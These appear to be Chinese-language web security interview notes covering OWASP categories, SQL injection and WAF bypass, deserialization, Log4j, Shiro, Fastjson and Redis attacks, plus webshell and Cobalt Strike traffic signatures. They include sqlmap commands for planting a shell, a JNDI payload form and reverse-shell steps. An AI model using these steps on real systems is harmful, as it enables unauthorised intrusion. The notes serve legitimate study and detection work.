OWASP top10

  • SQL 注入
  • 失效的身份认证和会话管理

  • 跨站脚本攻击 XSS
    • DOM型依赖的是浏览器端的DOM解析
    • HttpOnly：禁止js获取cookie
  • 直接引用不安全的对象
    • 例如,可能出现URL中调用资源处能通过../../方式访问其他目录资源,实现任意文件读取的问题
  • 安全配置错误
    • 不安全的默认配置、不完整的临时配置、开源云存储、错误的HTTP 标头配置以及包含敏感信息的详细错误信息
  • 敏感信息泄露
    • 需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据以及浏览器的交互数据
  • 缺少功能级的访问控制
    • 未授权访问
  • 跨站请求伪造 CSRF
  • 使用含有已知漏洞的组件
  • 未验证的重定向和转发
    • 钓鱼网站常用
    • 与ssrf不同,ssrf是调用外网无法访问的内网资源

SQL注入

原因

  • web应用程序对用户输入的数据过滤不严,导致用户输入的数据被当做SQL语句执行

类型有哪些

  • 反馈结果来看
    • 有回显
    • 无回显
  • 攻击手法
    • 联合 union select
    • 报错
      • updatexml、ExtractValue
        • 第二个参数需要xpath格式的字符串,传入的参数格式不符合要求时会报错
      • floor
        • 插入重复主键导致报错
    • 盲注
      • 布尔（看返回的页面是否一致）和时间（看服务器响应时间）
      • 常用函数
        • if
        • sleep
        • benchmark
        • get_lock
        • substr
        • ascii/ord
        • char
        • length
        • concat
        • groupconcat
    • 宽字节注入
      • 后端代码和数据库编码格式不一致,gbk会把两个字节转为一个中文字符。PHP会对单引号进行转义,单引号前加%df会被PHP改为 %df%5c单引号,可以绕过转义
    • 二次注入
      • 后端代码将用户输入的内容存进数据库时没有转义,取出时形成闭合导致注入
    • 堆叠注入
      • 拼接SQL语句，加分号断开，和服务器端的SQL语句形成闭合，然后在后面接着写SQL语句，服务器端接收后会继续在数据库执行
  • 注入点
    • 数字（and 1=1这种）
    • 字符（需要单引号闭合这种）
    • 搜索（需要%或者_当做占位符这种）
  • 传递方式
    • get
    • post
    • cookie
    • ua头/referer
    • host

写入shell条件

  • 知道web的绝对路径
  • 当前用户有文件写入和删除的权限
  • secure_file_priv函数不为空,文件导出路径与web路径重叠
  • PHP关闭魔术引号，php主动转义功能关闭

写入shell方式

  • 通过本地写入,into outfile函数,用到web绝对路径
  • 通过sqlmap –os-shell命令写入
    • 确认注入点是否为root权限
      • sqlmap -u 网址 –is-dba
    • 探知网站绝对路径
      • sqlmap -u 网址 –sql-shell
      • 然后再在sql-shell中直接使用sql命令读取数据库文件存放路径
        • sql-shell> select @@datadir;
      • 然后通过数据库文件的位置对网站所在的绝对路径进行猜测，如通过不同操作系统/中间件/服务器搭建方式判断网站根目录
    • 写入shell
      • sqlmap -u 网址 –os-shell
      • 选择语言后,选择可写目录,选择自定义目录后手动输入获得的网站绝对路径,拿到shell

SQL注入防御

  • 对关键函数或字符过滤如 ：union select order by information_schema 等
  • pdo预处理，使用预编译语句
  • 对数据库给与最小权限
  • 增加waf 安全设备 防火墙等

SQL注入绕过waf

  • 大小写双写
  • 使用编码：unicode编码 十六进制编码 url编码
  • 等价函数 如：mid，substr（） ==>substring（） &&和||==> and 和or =号可以用<>因为如果不大于不小于就是等于
  • 内联注释
  • 更换提交方式
  • 垃圾数据
  • 参数污染等等方式

PHP反序列化

简述

把对象变成一个可以传输的字符串,为了方便传输.PHP文件在执行结束后会销毁对象,但有时候可能会用到销毁的了的对象,重复调用代码比较麻烦,于是有了序列化和反序列化,可以把一个实例化对象长久的存在计算机磁盘上,调用的时候拿出来反序列化即可

漏洞原理

反序列化内容用户可控,且后台不正当地使用了魔术方法,使用户可以构造一个恶意的序列化字符串

利用流程

基本都是白盒测试，需要拿到代码,确定unserialize函数参数可控,然后看这些代码有哪些类,类中有哪些魔术方法,可以随着对象的创建或者销毁等操作调用哪些魔术方法,看魔术方法中有没有可以让我们利用的点,看类中有哪些参数可以通过反序列化修改,结合这些可以修改的参数和魔术方法中的利用点进行反序列化漏洞的利用

XSS/CSRF/SSRF

xss漏洞

跨站脚本攻击

服务器对用户输入的数据过滤不严，导致客户端浏览器在渲染服务器返回的html页面时，出现了预期值之外的脚本语句被执行。常用于盗取cookie、劫持会话、篡改网页内容等

漏洞分为三种：反射型、存储型、DOM型，反射型和DOM型的恶意代码存在URL里，存储型恶意代码存在服务器里，其中DOM型xss是通过浏览器调用执行恶意代码，通过js改变html造成xss攻击

xss、csrf漏洞、ssrf漏洞的区别

csrf：跨站请求伪造

ssrf：服务器请求伪造

xss漏洞通常用于盗取cookie，csrf是因为对请求包的来源校验不严，通过利用盗取的用户cookie伪造用户身份，进行信息盗取或者修改，所以叫跨站请求伪造，ssrf是服务器请求伪造，是服务器对用户提供的URL过于信任，导致攻击者可以通过该漏洞访问到外网访问不到的内网资源，或者攻击内网，或攻击其他访问不到的服务器

xxe漏洞了解吗？

外部实体注入漏洞，应用程序在解析xml输入时，没有禁止外部实体的加载，导致可以加载外部恶意xml文件，造成文件读取、命令执行、攻击内网等危害

Log4j

简述

该漏洞主要是由于日志在打印时当遇到${后，以:号作为分割，将表达式内容分割成两部分，前面一部分prefix，后面部分作为key，然后通过prefix去找对应的lookup，通过对应的lookup实例调用lookup方法，最后将key作为参数带入执行，引发远程代码执行漏洞。受影响版本为2.0 <= Apache Log4j <= 2.15.0-rc1,2.15.0-rc2不受影响

强特征

攻击者发送的数据包中可能存在${}字样，常用jndi注入，有时候出现在ua头

攻击手法

常用dns平台进行漏洞探测，如dnslog和ceye.io，之后在自己的vps上用jndi注入器构造监听payload，注入器会同时打开本机的rmi或者ldap服务，然后另起终端，用nc开启对payload中设置的监听端口的监听，然后把jndi注入器返回的rmi或ldap服务链接用get或post或ua头的方式，用${jndi:rmi://}构造payload提交

其他可用服务

jndi、ldap、rmi、jrmp、jmx、jms等

Shiro

简述

shiro框架提供了rememberme功能，用户登录成功后会生成通过序列化、AES加密、base64加密形成的cookie，攻击者可以通过解密得到AES编码，其中shiro550的AES密钥为硬编码，可以尝试字典破解得到加密前的序列化字符串，直接进行修改,然后加密替换原来的cookie，shiro721的AES加密使用的是CBC模式，可以用ysoserial生成包含恶意 payload的class，通过padding oracle工具对cookie进行爆破，并替换为生成的class，将padding oracle攻击工具生成的cookie替换原来的cookie达到反序列化并命令执行漏洞的利用

COOKIE加解密流程

序列化、AES加密、base64加密形成cookie，解密过程相反

强特征

请求包cookie中有RememberMe字段,返回包中包含rememberMe=deleteMe字段

修复方法

shiro550：去掉或者替换默认密钥，升级shiro版本

shiro721：升级shiro版本

Fastjson

简述

在请求包里构造恶意的json格式payload，漏洞在处理json对象时没有对@type字段进行过滤，导致攻击者可以传入恶意的TemplateImpl类，通过该类的_bytecodes字段生成Java实例，执行构造函数。

识别fastjson方法

正常请求为get且没有请求体，抓包，改提交方式为post，content-type字段改为application/json，提交内容为json格式，大括号不闭合，返回包会出现fastjson。该方法可屏蔽，屏蔽则用dns盲打

流量特征

@type，加一个恶意类和命令，content-type字段为application/json

不出网利用

https://xz.aliyun.com/t/12492

  3. 目录遍历

Redis

利用条件

  • redis 服务以 root 账户运行(有.ssh目录并有写入权限)
  • redis 无密码或弱密码进行认证（未授权）
  • redis 监听在 0.0.0.0 公网上

利用方法

  • 通过Redis的Info命令可以查看服务相关的参数和敏感信息（未授权。监听在 0.0.0.0 公网上且无密码或弱密码进行认证）
  • 写入webshell（存在未授权，有web目录的写入权限，写入webshell）
  • 上传SSH公钥获得SSH登录权限
  • 通过crontab反弹Shell
  • 利用Redis主从复制

流量特征

菜刀

  1. base64加密，解码有z0，z1，z2参数
  2. 请求体中存在assert eavl，base64等特征字符
  3. 存在固定的QGluaV9zZXQo、@ini_set
  4. 存在$_POST/$_GET/$_REQUEST

蚁剑

  1. 默认的USER-agent请求头是 antsword xxx，存在eval这种明显的特征
  2. 最明显的特征为@ini_set(“display_errors”，”0”);
  3. 参数名大多以”_0x”这种形式

冰蝎

3.0特征（回答首选）

  • 特征分析Content-Type: application/octet-stream 这是一个强特征 查阅资料可知octet-stream的意思是，只能提交二进制，而且只能提交一个二进制，如果提交文件的话，只能提交一个文件,后台接收参数只能有一个，而且只能是流（或者字节数组）
  • content-length长度为5720或5740(随Java版本改变)
  • Accept头有application/xhtml+xmlapplication/xmlapplication/signed-exchange属于弱特征（UA头的浏览器版本很老），或者说，内置16个ua头,比较老,属于n年前的浏览器产品,现在没什么人用

4.0特征（常问）

  • 10个内置ua头随机选用
  • 端口为49700左右，每次连接会递增
  • PHPwebshell存在固定代码
  • 请求头和响应头字节固定
  • webshell存在默认字符串，为默认连接密码的MD5的前16位
  • Content-type: application/x-www-form-urlencoded
  • 特定的标记，如”flag=0x52415631”
  • Accept: application/json, text/javascript, /; q=0.01
  • 请求头connection为keep-alive

哥斯拉

  • 特定的标记，如”XORHEAD”和”XORBODY”
  • Cookie中有一个非常关键的特征，最后会有个分号
  • 响应体的数据有一定特征，哥斯拉会把一个32位的md5字符串按照一半拆分，分别放在base64编码的数据的前后两部分。整个响应包的结构体征为：md5前十六位+base64+md5后十六位。
  • 请求中的Accept头是**Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8**
  • 响应头中的Cache-Control头是**Cache-Control: no-store, no-cache, must-revalidate**
  • 发送一段固定的payload，响应为空
  • 发送一段固定的test代码，执行结果为固定内容
  • 发送一段固定代码来获得基本信息

cs流量特征：

  • 基础特征：心跳包，端口在50050附近
  • 请求特征：下发的指令，url路径，老版本固定的ua头
  • 源码特征：**checksum8 （92L 93L）**
